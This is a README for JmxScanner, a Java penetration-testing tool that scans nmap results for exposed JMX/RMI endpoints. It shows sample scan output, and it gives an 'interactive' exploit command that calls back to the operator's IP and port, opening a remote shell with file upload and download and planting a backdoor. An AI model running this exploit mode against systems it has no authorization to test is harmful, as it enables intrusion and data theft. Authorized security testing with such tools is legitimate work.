# JmxScanner
A scanner for jmx endpoint from nmap file

## JmxScanner scan
JmxScanner is able to do different actions, but it is basically made for scanning targets from nmap file

Lets say you're in internal pentest and you have done a nmap --top-ports 10000 on a CIDR. If you wanna check quickwin jmx endpoint you can use the below command.
What's great with JmxScanner is that it will try to be the more exhaustive as he can, and not only focus on bound name *jmxrmi*.

Moreover, it will not trust **host redirection** by default.

Exemple:
```bash
java -jar target/jmx-scanner-0.1.0.jar --action scan --nmap-file test.nmap 
[>] Parsing nmap file: test.nmap
	[+] RMI Target -- 127.0.0.1:1617
	[+] RMI Target -- 127.0.0.1:1337
	[+] RMI Target -- 127.0.0.1:1717
	[+] RMI Target -- 172.17.1.27:1099
	[+] RMI Target -- 172.17.1.32:49191
	[+] RMI Target -- 172.17.1.32:49203
	[+] RMI Target -- 172.17.1.58:1099
	[+] RMI Target -- 172.17.1.70:1098
	[+] RMI Target -- 172.17.1.70:7099
	[+] RMI Target -- 172.17.1.70:58970
	[+] RMI Target -- 172.17.1.75:49190
	[+] RMI Target -- 172.17.1.81:1099

============[ 127.0.0.1:1617 ]============
[+] Connecting to jmx server
[+] Connection successful
[>] Target 127.0.0.1:1617/jmxrmi is VULNERABLE
====================================

[-] Failed to catch remote registry
[-] No registry found for remote: 127.0.0.1:1337 ==> NOT_VULNERABLE

============[ 127.0.0.1:1717 ]============
[+] Connecting to jmx server
[+] Connection successful
[>] Target 127.0.0.1:1717/jmxrmi is VULNERABLE
====================================

[-] Failed to catch remote registry
[-] No registry found for remote: 172.17.1.27:1099 ==> NOT_VULNERABLE
...
```
## Why another tool
Yep a lot of tools are able to scan accessible jmx Endpoint.
But I made this tools for some reasons:
 1. Learn more about java RMI by myself
 2. Implementnig a scanner that can automate this task for internal pentest
 3. Finally, implement the choice to follow the Server redirection or not which seems really important to me

## Credits to other tools
Tools that I used for exploiting java-rmi and that helped me make this one:
 - remote-method-guesser (and obviously this part: resources/templates/SampleTemplate.java <3 to bypass redirect)
 - https://github.com/qtc-de/beanshooter
 - https://github.com/siberas/sjet
 - https://github.com/flubshi/jmx-exploiter

## Other actions
JmxScanner can also exploit the vulnerability, but basically it is most used to scan targets from an nmap file.

If you want to exploit you can use the following command:
```bash
java -jar target/jmx-scanner-0.1.0.jar --action interactive -t <target> -p <port> -sh <your_ip> -sp <your_port>
```
You shall then get an interactive shell with some options (type help to see them)

Options available are (for now):
 - download **<file_to_download>**
 - upload **<file_to_upload>** **<name_on_the_remote_target>**
 - exit (exit the shell and clean the backdoor)
 - help

## Install
Lazy:
 - Just use the jar already built --'
 - java -jar target/jmx-scanner-0.1.0.jar --help

Recommended:
 - sudo apt install maven
 - mvn package
 - java -jar target/jmx-scanner-0.1.0.jar --help

## To add
 - [ ] Handle jonas / jboss / tomcat ...
 - [ ] Handle SSL
 - [ ] Handle cd in **interactive** shell
